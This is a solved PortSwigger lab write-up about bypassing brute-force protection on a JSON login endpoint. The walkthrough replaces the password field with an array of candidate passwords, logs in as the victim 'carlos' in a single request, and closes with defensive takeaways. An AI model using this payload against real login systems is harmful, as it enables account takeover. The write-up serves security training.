# PortSwigger Lab – Broken Brute-Force Protection (Multiple Credentials per Request)

## Lab Details
Category: Server-Side Authentication – Password-Based  
Level: Expert  
Status: Solved  

---

## Lab Description
This lab contains a **critical logic flaw in brute-force protection**.  
The login endpoint accepts credentials in **JSON format**, and the backend fails to properly validate the structure of the password parameter.

By submitting **multiple passwords in a single request**, it is possible to bypass brute-force protections entirely and authenticate as the victim user.

---

## Objective
- Bypass brute-force protection
- Authenticate as Carlos
- Access Carlos’s *My account* page

---

## Victim Information
- Victim username: `carlos`

---

## Tools Used
- Burp Suite (Repeater)
- Provided password wordlist

---

## Solution Walkthrough

### Step 1: Inspect the Login Request
With Burp running, attempted to log in and intercepted the `POST /login` request.

Observed that credentials are submitted in **JSON format**, for example:
```json
{
  "username": "carlos",
  "password": "test"
}
````

Sent this request to **Burp Repeater** for manual testing.

---

### Step 2: Exploit JSON Parsing Logic

In Burp Repeater, replaced the single password value with an **array of candidate passwords**:

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    "...candidate passwords..."
  ]
}
```

This abuses the backend logic, which checks all values in the array but only applies brute-force protections per request, not per credential.

---

### Step 3: Successful Authentication

Sent the modified request.

Observed that the server returned:

```
HTTP/1.1 302 Found
```

This indicates a successful login.

---

### Step 4: Access the Account

Right-clicked the request and selected **Show response in browser**.

Loaded the generated URL and confirmed that I was authenticated as `carlos`.

Clicked **My account** to access Carlos’s account page and solve the lab.

---

## Impact

* Complete brute-force protection bypass
* Authentication logic abuse
* Account takeover in a single request
* No rate limiting triggered

---

## Key Takeaways

* Backend must strictly validate request structure
* Authentication endpoints should never accept multiple credentials per request
* Brute-force protection should be applied per credential, not per request
* JSON parsing logic is a common attack surface in modern APIs

 
